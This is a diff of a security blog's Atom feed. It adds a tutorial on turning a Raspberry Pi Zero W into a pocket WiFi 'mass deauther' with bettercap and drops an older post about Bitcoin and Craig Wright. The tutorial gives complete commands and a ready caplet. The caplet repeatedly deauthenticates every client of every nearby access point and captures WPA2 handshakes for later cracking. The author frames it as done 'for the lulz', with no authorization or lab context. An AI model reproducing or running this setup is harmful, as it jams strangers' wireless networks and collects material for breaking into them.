@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.evilsocket.net/"/>
-  <updated>2018-07-28T14:17:57.080Z</updated>
+  <updated>2018-07-28T18:50:09.961Z</updated>
   <id>https://www.evilsocket.net/</id>
   
   <author>
@@ -14,6 +14,109 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W</title>
+    <link href="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/"/>
+    <id>https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/</id>
+    <published>2018-07-28T17:01:56.000Z</published>
+    <updated>2018-07-28T18:50:09.961Z</updated>
+    
+    <content type="html"><![CDATA[<p>A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting “side effect” of this jammer (the initial intent was <em>purely for the lulz</em>) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.</p>
+<p>Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given <a href="https://twitter.com/evilsocket/status/1021367629901115392" target="_blank" rel="external">the interest the tweet had</a> I thought to share this writeup :)</p>
+<p><img src="/images/2018/07/deauth.png" alt="deauth"></p>
+<center><small><i>This awesome case has been designed by <a href="https://twitter.com/elkentaro" target="_blank">@elkentaro</a> and can be found on <a href="https://www.thingiverse.com/thing:3018480" target="_blank" rel="external">his Thingverse page</a>.</i></small></center>
+
+<a id="more"></a>
+<h3 id="0x00-FAQ"><a href="#0x00-FAQ" class="headerlink" title="[0x00] FAQ"></a>[0x00] FAQ</h3><p><strong>Why not using Nethunter or some other Kali image for Android and a smartphone instead?</strong></p>
+<p>Monitor mode works, injection doesn’t. Using an external WiFi makes the whole thing bigger and kills the battery.</p>
+<p><strong>Why not using … instead?</strong></p>
+<p>There are many alternatives to the setup I’m going to describe, it’s not necessarily the best, just the one that works for me.</p>
+<p><strong>Why …?</strong></p>
+<p>BECAUSE. The point of this post is not just the hardware, but mostly how to use bettercap to attack wifi.</p>
+<h3 id="0x01-Kali-image-and-initial-headless-configuration"><a href="#0x01-Kali-image-and-initial-headless-configuration" class="headerlink" title="[0x01] Kali image and initial headless configuration."></a>[0x01] Kali image and initial headless configuration.</h3><p>First thing first, you’ll need to download the <strong>Kali Linux Rpi0w Nexmon</strong> image from <a href="https://www.offensive-security.com/kali-linux-arm-images/" target="_blank" rel="external">this page</a> and burn it to the uSD card you’re going to use for the rpi using the usual <code>dd</code> method, but before unmounting it, we need to enable SSH at boot and configure it to connect to our home WiFi network for the initial configuration, keep in mind this is just temporary and the main wifi interface will be used for packet injection later, while we will be able to connect via bluetooth to the board.</p>
+<p>From the computer you used to burn the image on your micro sd, mount it again if needed and then:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># this will enable ssh at boot</span></div><div class="line">touch /sd-mount-point/boot/ssh</div><div class="line"><span class="comment"># let's setup wlan0</span></div><div class="line">nano /sd-mount-point/root/etc/network/interfaces</div></pre></td></tr></table></figure>
+<p>Fill this file with the following contents:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">auto lo</div><div class="line"></div><div class="line">iface lo inet loopback</div><div class="line"></div><div class="line">allow-hotplug wlan0</div><div class="line">iface wlan0 inet dhcp</div><div class="line">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div><div class="line">iface default inet dhcp</div></pre></td></tr></table></figure>
+<p>Now we’ll add the details of the WiFi network we want the rpi to connect automatically for configuration:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nano /sd-mount-point/root/etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>
+<p>And add this:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">country=GB</div><div class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</div><div class="line">update_config=1</div><div class="line"></div><div class="line">network=&#123;</div><div class="line">        ssid=&quot;YourWiFiName&quot;</div><div class="line">        psk=&quot;y0urw1f!p455w0rd&quot;</div><div class="line">        key_mgmt=WPA-PSK</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Reboot the RPI and it should connect to your WiFi, search for its IP address (either by broadcast ping, or using bettercap itself, i usually use the <a href="https://github.com/bettercap/caplets/blob/master/netmon.cap" target="_blank" rel="external">netmon</a> caplet to see what’s going on on my network) and finally SSH to it using the default Kali credentials:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># this will allow you to login with your SSH key instead of a password</span></div><div class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub root@pita-ip</div><div class="line">ssh root@pita-ip</div></pre></td></tr></table></figure>
+<p>Once you’re logged in:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># always change the default root password</span></div><div class="line">passwd</div><div class="line"><span class="comment"># regenerate ssh keys</span></div><div class="line">ssh-keygen</div><div class="line"><span class="comment"># set a nicer hostname :D</span></div><div class="line">hostname -b pita</div><div class="line"><span class="built_in">echo</span> pita &gt; /etc/hostname</div><div class="line"><span class="built_in">echo</span> <span class="string">"127.0.0.1 pita"</span> &gt;&gt; /etc/hosts</div><div class="line"><span class="comment"># update the system</span></div><div class="line">apt update </div><div class="line">apt upgrade</div><div class="line"><span class="comment"># install a few useful packages and setup swap</span></div><div class="line">apt install git dphys-swapfile</div><div class="line"><span class="comment"># set CONF\_SWAPSIZE to 1024</span></div><div class="line">nano /etc/dphys-swapfile</div><div class="line">systemctl <span class="built_in">enable</span> dphys-swapfile</div><div class="line"><span class="comment"># reboot to apply the effects</span></div><div class="line">reboot</div></pre></td></tr></table></figure>
+<h3 id="0x02-Connecting-via-Bluetooth-with-bt-nap"><a href="#0x02-Connecting-via-Bluetooth-with-bt-nap" class="headerlink" title="[0x02] Connecting via Bluetooth with bt-nap"></a>[0x02] Connecting via Bluetooth with bt-nap</h3><p>We want to use <code>wlan0</code> for the monitor mode and injection using Nexmon, meaning we need another way to connect to our board. For this, we can setup the rpi to work as a bt-nap server, basically you will be able to connect via bluetooth and reach it with an IP address on that bluetooth connection, this works both from a laptop and from a smartphone as well.</p>
+<center><br><blockquote class="twitter-tweet" data-conversation="none" data-lang="it"><p lang="en" dir="ltr">Power from your smartphone, ssh over bluetooth and a mass deauther in your pocket 😈<a href="https://twitter.com/bettercap?ref_src=twsrc%5Etfw" target="_blank" rel="external">@bettercap</a> + <a href="https://twitter.com/hashtag/pita?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="external">#pita</a> = ❤️ <a href="https://t.co/lDn9Tie3W9" target="_blank" rel="external">pic.twitter.com/lDn9Tie3W9</a></p>&mdash; 👽 (@evilsocket) <a href="https://twitter.com/evilsocket/status/1021378841749721091?ref_src=twsrc%5Etfw" target="_blank" rel="external">23 luglio 2018</a></blockquote><br><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>
+
+<p>Let’s connect once more via WiFi and SSH:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ssh root@pita-ip</div><div class="line"></div><div class="line"><span class="comment"># install a few dependencies</span></div><div class="line">apt install pulseaudio pulseaudio-module-zeroconf alsa-utils avahi-daemon pulseaudio-module-bluetooth</div><div class="line">git <span class="built_in">clone</span> https://github.com/bablokb/pi-btnap</div><div class="line"><span class="comment"># install btnap as a server</span></div><div class="line">./pi-btnap/tools/install-btnap server</div></pre></td></tr></table></figure>
+<p>Fix the bluetooth configuration file <code>/etc/systemd/system/bluetooth.target.wants/bluetooth.service</code> by disabling the SAP plugin that would break bluetooth, change the <code>ExecStart</code> part with:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ExecStart=/usr/lib/bluetooth/bluetoothd --noplugin=sap</div></pre></td></tr></table></figure>
+<p>Let’s set the bluetooth name of your device by editing <code>/etc/bluetooth/main.conf</code> and finally edit the btnap configuration file itself, <code>/etc/btnap.conf</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">MODE=&quot;server&quot;</div><div class="line">BR_DEV=&quot;br0&quot;</div><div class="line">BR_IP=&quot;192.168.20.99/24&quot;</div><div class="line">BR_GW=&quot;192.168.20.1&quot; </div><div class="line">ADD_IF=&quot;lo&quot; </div><div class="line">REMOTE_DEV=&quot;&quot; </div><div class="line">DEBUG=&quot;&quot;</div></pre></td></tr></table></figure>
+<p>Enable all the services at boot and restart them:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">systemctl <span class="built_in">enable</span> bluetooth</div><div class="line">systemctl <span class="built_in">enable</span> btnap</div><div class="line">systemctl <span class="built_in">enable</span> dnsmasq</div><div class="line"></div><div class="line">service bluetooth restart</div><div class="line">service dnsmasq restart</div><div class="line">service btnap restart</div></pre></td></tr></table></figure>
+<p>Before being able to connect via bluetooth, we need to manually pair and trust the device we’re going to use (remember to repeat this step for every new device you want to allow to connect to the PITA board), make sure your control device (your laptop for instance) has bluetooth enabled and it’s visible, then from the pita:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">bluetoothctl</div><div class="line">&gt; agent on</div><div class="line">&gt; scan on</div><div class="line">... <span class="built_in">wait</span> <span class="keyword">for</span> your device to show up ...</div><div class="line">...</div><div class="line">... now pair with its address</div><div class="line">&gt; pair aa:bb:cc:dd:ee:ff</div><div class="line">... and trust it permantently ...</div><div class="line">&gt; trust aa:bb:cc:dd:ee:ff</div><div class="line">... <span class="built_in">wait</span> ...</div><div class="line">&gt; quit</div></pre></td></tr></table></figure>
+<p>We’re now ready to “free” the wlan0 interface and use it for more cool stuff, let’s change the file <code>/etc/network/interfaces</code> to:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">auto lo</div><div class="line">iface lo inet loopback</div><div class="line"></div><div class="line">allow-hotplug wlan0</div><div class="line">iface wlan0 inet static</div></pre></td></tr></table></figure>
+<p>From the board now, disable wpa_supplicant and reboot:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service wpa_supplicant <span class="built_in">disable</span></div><div class="line">reboot</div></pre></td></tr></table></figure>
+<p>After reboot, you’ll be able to connect to the board via bluetooth.</p>
+<p><img src="/images/2018/07/bt.png" alt="bt"></p>
+<p>Your system (this depends on the system you’re using, on most GNU/Linux distributions and Android this is basically automatically detected) should now have a new DHCP based <code>Pita Network</code> entry in the network manager:</p>
+<p><img src="/images/2018/07/net1.png" alt="pita network"></p>
+<p>Once connected, you should see a new <code>bnep0</code> network interface:</p>
+<p><img src="/images/2018/07/net2.png" alt="ifconfig"></p>
+<p>You can finally ssh to your PITA board via bluetooth now :)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"192.168.20.99 pita"</span> &gt;&gt; /etc/hosts</div><div class="line">ssh root@pita</div></pre></td></tr></table></figure>
+<h3 id="0x03-Having-fun-with-wlan0-and-bettercap"><a href="#0x03-Having-fun-with-wlan0-and-bettercap" class="headerlink" title="[0x03] Having fun with wlan0 and bettercap"></a>[0x03] Having fun with wlan0 and bettercap</h3><p>Now that we can power our board either from a powerbank or the smartphone itself and we can connect to it via SSH over bluetooth, the next step is to install bettercap itself, we will compile it directly on the PITA, it’ll take a while but it’s very easy:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">apt install golang libpcap-dev libnetfilter-queue-dev wget build-essentials</div><div class="line"><span class="comment"># you should make this persistent in your .bashrc or .zshrc file</span></div><div class="line"><span class="built_in">export</span> GOPATH=/root/gocode</div><div class="line">mkdir -p <span class="variable">$GOPATH</span></div><div class="line">go get github.com/bettercap/bettercap</div><div class="line"><span class="comment"># wait</span></div><div class="line"><span class="comment"># let's install it for everyone to enjoy ^_^</span></div><div class="line"><span class="built_in">cd</span> /root/gocode/src/github.com/bettercap/bettercap</div><div class="line">make install</div><div class="line"><span class="comment"># let's download the pita.cap caplet</span></div><div class="line"><span class="built_in">cd</span> /usr/share/bettercap/caplets/</div><div class="line">wget <span class="string">"https://raw.githubusercontent.com/bettercap/caplets/master/pita.cap"</span></div></pre></td></tr></table></figure>
+<p>The <a href="https://github.com/bettercap/caplets/blob/master/pita.cap" target="_blank" rel="external">pita.cap</a> caplet will take care of starting wlan0 in monitor mode, periodically send deauth packets and also sniffing for WPA2 handshakes as they arrive, you can launch it and keep it persistent with something like screen or tmux. It is a basic example of what you can do now, many other functionalities can be found in the <a href="https://github.com/bettercap/caplets" target="_blank" rel="external">caplets repo</a> and generally in the project <a href="https://github.com/bettercap/bettercap/wiki" target="_blank" rel="external">wiki</a>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"># More info about this caplet: https://twitter.com/evilsocket/status/1021367629901115392</div><div class="line"></div><div class="line">set $ &#123;bold&#125;😈 » &#123;reset&#125;</div><div class="line"></div><div class="line"># make sure wlan0 is in monitor mode</div><div class="line"># ref: https://github.com/offensive-security/kali-arm-build-scripts/blob/master/rpi3-nexmon.sh</div><div class="line">!monstop</div><div class="line">!monstart</div><div class="line"></div><div class="line"># every 5 seconds:</div><div class="line"># - clear the screen</div><div class="line"># - show the list of nearby access points </div><div class="line"># - deauth every client from each one of them</div><div class="line">set ticker.period 5</div><div class="line">set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff</div><div class="line"># sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.</div><div class="line">set net.sniff.verbose true</div><div class="line">set net.sniff.filter ether proto 0x888e</div><div class="line">set net.sniff.output wpa.pcap</div><div class="line"></div><div class="line"># uncomment to only hop on these channels:</div><div class="line"># wifi.recon.channel 1,2,3</div><div class="line">wifi.recon on</div><div class="line">ticker on</div><div class="line">net.sniff on</div><div class="line"></div><div class="line"># we&apos;ll see lots of probes after each deauth, just skip the noise ...</div><div class="line">events.ignore wifi.client.probe</div><div class="line"># start fresh</div><div class="line">events.clear</div><div class="line">clear</div></pre></td></tr></table></figure>
+<p>To start bettercap with this caplet:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ifconfig wlan0 up</div><div class="line">bettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/pita.cap</div><div class="line"><span class="comment"># enjoy ^_^</span></div></pre></td></tr></table></figure>
+<p>Just after a few minutes my prototype was able to deauth and capture the handshake of some device:</p>
+<p><img src="/images/2018/07/victim.png" alt="victim"></p>
+<p>I hope I did not forget about any step, the btnep part specifically was a little bit tricky to setup, let me know in the comments if something doesn’t work for you and I’ll try to help and fix this writeup, as usual, <strong>enjoy!</strong></p>
+<center><br><img src="https://abs.twimg.com/emoji/v2/72x72/1f984.png"><br></center>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting “side effect” of this jammer (the initial intent was &lt;em&gt;purely for the lulz&lt;/em&gt;) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.&lt;/p&gt;
+&lt;p&gt;Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given &lt;a href=&quot;https://twitter.com/evilsocket/status/1021367629901115392&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;the interest the tweet had&lt;/a&gt; I thought to share this writeup :)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018/07/deauth.png&quot; alt=&quot;deauth&quot;&gt;&lt;/p&gt;
+&lt;center&gt;&lt;small&gt;&lt;i&gt;This awesome case has been designed by &lt;a href=&quot;https://twitter.com/elkentaro&quot; target=&quot;_blank&quot;&gt;@elkentaro&lt;/a&gt; and can be found on &lt;a href=&quot;https://www.thingiverse.com/thing:3018480&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;his Thingverse page&lt;/a&gt;.&lt;/i&gt;&lt;/small&gt;&lt;/center&gt;
+    
+    </summary>
+    
+    
+      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
+    
+      <category term="wifi" scheme="https://www.evilsocket.net/tags/wifi/"/>
+    
+      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
+    
+      <category term="bluetooth" scheme="https://www.evilsocket.net/tags/bluetooth/"/>
+    
+      <category term="raspberry" scheme="https://www.evilsocket.net/tags/raspberry/"/>
+    
+      <category term="rpi" scheme="https://www.evilsocket.net/tags/rpi/"/>
+    
+      <category term="rpi zero w" scheme="https://www.evilsocket.net/tags/rpi-zero-w/"/>
+    
+      <category term="rpi0w" scheme="https://www.evilsocket.net/tags/rpi0w/"/>
+    
+      <category term="kali" scheme="https://www.evilsocket.net/tags/kali/"/>
+    
+      <category term="deauth" scheme="https://www.evilsocket.net/tags/deauth/"/>
+    
+      <category term="btnap" scheme="https://www.evilsocket.net/tags/btnap/"/>
+    
+  </entry>
   
   <entry>
     <title>Go Is Amazing, So Here&#39;s What I Don&#39;t Like About It</title>
@@ -1074,11 +1177,11 @@ Options:
     </summary>
     
     
-      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
-    
       <category term="hack" scheme="https://www.evilsocket.net/tags/hack/"/>
     
       <category term="hacking" scheme="https://www.evilsocket.net/tags/hacking/"/>
+    
+      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
     
       <category term="coffee" scheme="https://www.evilsocket.net/tags/coffee/"/>
     
@@ -1706,82 +1809,6 @@ php artisan db:seed --class=CurrenciesTableSeeder
       <category term="banking" scheme="https://www.evilsocket.net/tags/banking/"/>
     
       <category term="trezor" scheme="https://www.evilsocket.net/tags/trezor/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Is This a Declaration of Cyber War?</title>
-    <link href="https://www.evilsocket.net/2016/05/03/is-this-a-declaration-of-cyber-war/"/>
-    <id>https://www.evilsocket.net/2016/05/03/is-this-a-declaration-of-cyber-war/</id>
-    <published>2016-05-02T22:28:30.000Z</published>
-    <updated>2016-05-02T23:08:54.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>Hey guys, I’m writing this post mostly to save the stuff I’m going to share from being censored/removed, but also to share some of my thoughts about the thing.</p>
-<p>I like spy movies a lot, so if this just looks like bullshit to you be fair and be good, I’m just worried about the people’s privacy :)</p>
-<a id="more"></a>
-<p><img src="/images/2016/05/internet-privacy.jpg" alt="privacy"></p>
-<h3 id="BitCoin-Drama"><a href="#BitCoin-Drama" class="headerlink" title="BitCoin Drama"></a>BitCoin Drama</h3><p>I don’t know if you’ve been following the whole BitCoin and Satoshi Nakamoto drama, basically Mr. Craig Wright <a href="http://www.economist.com/news/business-and-finance/21698060-craig-wright-reveals-himself-as-satoshi-nakamoto" target="_blank" rel="external">claims that he is</a> Nakamoto, reveiling, finally, the true BitCoin creator’s identity.</p>
-<p>He also showed some alleged <a href="http://www.engadget.com/2016/05/02/bitcoin-creator-craig-wright/" target="_blank" rel="external">crypto proof</a>.</p>
-<p>Suddenly, on <a href="https://www.reddit.com/r/Bitcoin/comments/4hflr3/craig_wrights_signature_is_worthless/" target="_blank" rel="external">Reddit</a> people started to explain how this “proof” was fake.</p>
-<pre><code>JoukeH discovered that the signature on Craig Wright&apos;s blog post is not a signature of any &quot;Sartre&quot; message, but just the signature inside of Satoshi&apos;s 2009 Bitcoin transaction. It absolutely doesn&apos;t show that Wright is Satoshi, and it does very strongly imply that the purpose of the blog post was to deceive people.
-So Craig Wright is once again shown to be a likely scammer. When will the media learn?
-Take the signature being “verified” as proof in the blog post:
-MEUCIQDBKn1Uly8m0UyzETObUSL4wYdBfd4ejvtoQfVcNCIK4AIgZmMsXNQWHvo6KDd2Tu6euEl13VTC3ihl6XUlhcU+fM4=
-
-Convert to hex:
-3045022100c12a7d54972f26d14cb311339b5122f8c187417dde1e8efb6841f55c34220ae0022066632c5cd4161efa3a2837764eee9eb84975dd54c2de2865e9752585c53e7cce
-
-Find it in Satoshi&apos;s 2009 transaction:
-https://blockchain.info/tx/828ef3b079f9c23829c56fe86e85b4a69d9e06e5b54ea597eef5fb3ffef509fe?format=hex
-Also, it seems that there&apos;s substantial vote manipulation in /r/Bitcoin right now...
-</code></pre><p>I just thought “oh, some bad guy is speculating on bitcoins … meh” … but then <a href="https://www.reddit.com/r/Bitcoin/comments/4hj1xu/why_i_declined_to_verify_sns_identity_two_weeks/" target="_blank" rel="external">this came out</a>:</p>
-<pre><code>Why I declined to &quot;verify&quot; SN&apos;s identity two weeks ago
-
-About two weeks ago I was contacted and asked to offer security advice for a project. I was asked to sign an NDA in order to discuss the project itself, something I am reluctant to do, in general. Once I received the NDA however, it became obvious that the project was related to verifying the identity of Satoshi Nakamoto. I immediately declined the offer, declined to participate and declined to sign the NDA.
-I&apos;m sure many people will think I was wrong to decline the &quot;opportunity&quot; to verify SN&apos;s identity. From my perspective, the request for me to verify his/her/their identity is in itself an appeal to authority. It is replacing public cryptographic proof with endorsement by a third party. If SN wants to &quot;prove&quot; their identity, they don&apos;t need an &quot;authority&quot; to do so. They can do it in a public, open manner. To ask people in the space who have a reputation to stake that reputation and vouch for SN&apos;s identity raises many red flags in my mind.
-I don&apos;t know if Craig Wright is SN. I don&apos;t care and I don&apos;t want to know.
-As I have expressed many times in the past, I think the identity of Satoshi Nakamoto does not matter. More importantly I think it serves to distract from the fact that bitcoin is not controlled by anyone and is not a system of Appeal-to-Authority. Identifying the creator only serves to feed the appeal-to-authority crowd, as if SN is some kind of infallible prophet, or has any say over bitcoin&apos;s future.
-Identity and authority are distractions from a system of mathematical proof that does not require trust. This is not a telenovela. Bitcoin is a neutral framework of trust that can bring financial empowerment to billions of people. It works because it doesn&apos;t depend on any authority. Not even Satoshi&apos;s.
-Back to work.
-</code></pre><p>The user who posted is not just some unknown, random user, <a href="https://www.reddit.com/user/andreasma" target="_blank" rel="external">he’s a well recognized part of the Reddit community</a>.</p>
-<p>I’m neither a crypto expert nor a politics expert, but <strong>what I know</strong> is that during these very same days, governments all over the world are discussiong about our privacy, the right to have encrypted and private communications and so forth.</p>
-<ul>
-<li><a href="http://thehackernews.com/2016/04/fbi-hacking-power.html" target="_blank" rel="external">http://thehackernews.com/2016/04/fbi-hacking-power.html</a></li>
-<li><a href="http://thehackernews.com/2016/04/tor-unmask-malware.html" target="_blank" rel="external">http://thehackernews.com/2016/04/tor-unmask-malware.html</a></li>
-<li><a href="http://thehackernews.com/2016/04/apple-vulnerability.html" target="_blank" rel="external">http://thehackernews.com/2016/04/apple-vulnerability.html</a></li>
-</ul>
-<p>And these links are just a small example about what is happening.</p>
-<p>Having said that … isn’t this BitCoin thing very peculiar at this time?</p>
-<p>If someone is really trying to replace cryptokeys and take control of the BitCoin market, who is he? Or … who are them? Which organization is big enough to compromise/buy the media and spread such BS at such level?</p>
-<p>Is it just me, or this is some kind of declaration of cyber war to the free people of the free web, us?</p>
-<p>Maybe … yeah, it’s just me … or maybe George Orwell was very right.</p>
-<pre><code>Perhaps a lunatic was simply a minority of one.
-- George Orwell, 1984
-</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Hey guys, I’m writing this post mostly to save the stuff I’m going to share from being censored/removed, but also to share some of my thoughts about the thing.&lt;/p&gt;
-&lt;p&gt;I like spy movies a lot, so if this just looks like bullshit to you be fair and be good, I’m just worried about the people’s privacy :)&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="privacy" scheme="https://www.evilsocket.net/tags/privacy/"/>
-    
-      <category term="bitcoin" scheme="https://www.evilsocket.net/tags/bitcoin/"/>
-    
-      <category term="btc" scheme="https://www.evilsocket.net/tags/btc/"/>
-    
-      <category term="satoshi nakamoto" scheme="https://www.evilsocket.net/tags/satoshi-nakamoto/"/>
-    
-      <category term="identity" scheme="https://www.evilsocket.net/tags/identity/"/>
-    
-      <category term="craig wright" scheme="https://www.evilsocket.net/tags/craig-wright/"/>
-    
-      <category term="government" scheme="https://www.evilsocket.net/tags/government/"/>
-    
-      <category term="cryptography" scheme="https://www.evilsocket.net/tags/cryptography/"/>
     
   </entry>
   
